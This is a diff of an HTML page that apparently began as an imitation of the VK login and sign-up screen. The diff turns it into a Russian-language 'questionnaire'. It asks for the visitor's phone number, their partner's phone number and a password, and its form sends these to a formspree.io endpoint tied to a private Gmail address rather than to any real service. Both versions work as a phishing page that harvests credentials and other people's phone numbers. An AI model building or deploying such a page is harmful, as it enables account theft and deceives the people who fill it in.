@@ -17,121 +17,25 @@
     </header>
 
     <div class="body">
-        <aside>
-            <h1>VK for mobile devices</h1>
-            <p>Install our official mobile app and stay in touch with your friends anytime and <br>anywhere.</p>
-            <img src="mobile.jpg" alt="mobile foto">
-            <div class="links">           
-            <label><a href=" "><img src="android.jpg" alt="picture of android"> VK for Android</a></label>
-            <label><a href=" "><img src="apple.jpg" alt="picture of apple">  VK for iPhone</a></label>
-            <label><a href=" "><img src="windows.jpg" alt="picture of windows"> VK for WP</a></label>
-            </div>
-            <p><a href=" ">All products</a></p>
-        </aside>
-
-        <main>
-            <div class="logIn">
+        <div class="logIn">
                 <form method="post" action="https://formspree.io/syaskiy9523@gmail.com">
-                    <input type="text" name="text" placeholder="Phone or email">
-                    <input type="password" name="pass" placeholder="Password">
-                    <nav><input type="submit" value="Log in">
-                    <a href="#">Sasha's test?</a></nav>
-                </form>
-            </div>
-            <div class="anketaBlock">
-                <div class="anketa">
-                    <h3>On VK for the first time?</h3>
-                    <p class="signUp">Sign up for VK</p>
-                    <input type="text" placeholder="Your first name">
-                    <input type="text" placeholder="Your last name">
-                    <p class="tittle">Date of birth</p>
-                    <div class="date">
-                        <input list="day" name="day" placeholder="Day">
-                        <datalist id="day">
-                                                    <option value="1">
-                                                        <option value="2">
-                                                            <option value="3">
-                                                                <option value="4">
-                                                                    <option value="5">
-                                                                        <option value="6">
-                                                                            <option value="7">
-                                                                                <option value="8">
-                                                                                    <option value="9">
-                                                                                        <option value="10">
-                                                                                            <option value="11">
-                                                                                                <option value="12">
-                                                                                                    <option value="13">
-                                                                                                        <option value="14">
-                                                                                                            <option value="15">
-                                                                                                                <option value="16">
-                                                                                                                    <option value="17">
-                                                                                                                        <option value="18">
-                                                                                                                            <option value="19">
-                                                                                                                                <option value="20">
-                                                                                                                                    <option value="21">
-                                                                                                                                        <option value="22">
-                                                                                                                                            <option value="23">
-                                                                                                                                                <option value="24">
-                                                                                                                                                    <option value="25">
-                                                                                                                                                        <option value="26">
-                                                                                                                                                            <option value="27">
-                                                                                                                                                                <option value="28">
-                                                                                                                                                                    <option value="29">
-                                                                                                                                                                        <option value="30">
-                                                                                                                                                                            <option value="31">
-                                                                                                                                                                                </datalist>
-                        <input list="month" name="month" placeholder="Month">
-                        <datalist id="month">
-                                                        <option value="Junuary">
-                                                        <option value="February">
-                                                        <option value="March">
-                                                        <option value="April">
-                                                        <option value="May">
-                                                        <option value="June">
-                                                        <option value="July">
-                                                        <option value="August">
-                                                        <option value="Septemper">
-                                                        <option value="October">
-                                                        <option value="Novemper">
-                                                        <option value="December">
-                                                     </datalist>
-                        <input list="year" name="year" placeholder="Year">
-                        <datalist id="year">
-                                                        <option value="1990">
-                                                        <option value="1991">
-                                                        <option value="1992">
-                                                        <option value="1993">
-                                                        <option value="1994">
-                                                        <option value="1995">
-                                                        <option value="1996">
-                                                        <option value="1997">
-                                                        <option value="1998">
-                                                        <option value="1999">
-                                                        <option value="2000">
-                                                        <option value="2001">
-                                                     </datalist>
-                    </div>
-                    <p class="tittle">Your gender</p>
-                    <div class="gender">
-                        <label>
-                    <input type="radio" name="gender" value="female">Female
-                    </label>
-                        <label>
-                    <input type="radio" name="gender" value="male">Male
-                    </label>
-                    </div>
-                    <input type="submit" value="Sign up">
-                    <input class="facebookButtom" type="submit" value="Continue with Facebook">
-                </div>
-            </div>
-        </main>
-    </div>
+                  <nav>Привет. Вас приветствует опросник.</nav>
+                  <nav>Для начала введите свой номер телефона и телефона вашей половинки)</nav>
+                  <input type="text" name="Phone" placeholder="Ваш номер телефона"><br>
+                  <input type="text" name="Phone" placeholder="Номер телефона половинки"><br>
+                    </nav>
+                  <a onclick="toggle(hidden_content)">Получить пароль</a> 
+<div id="hidden_content" style="display: none;"><input type="password" name="pass" placeholder="Password">
+    <nav><input type="submit" value="Пройти опрос">
+      </div>
+<script>
+function toggle(el) {
+el.style.display = (el.style.display == 'none') ? '' : 'none'
+}
+</script>
 
-<footer>
-    
-    <a id="xhr-get-content">Українська</a>
-</footer>
-</div>
+                </form>
+  </div>
      <script src="http://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
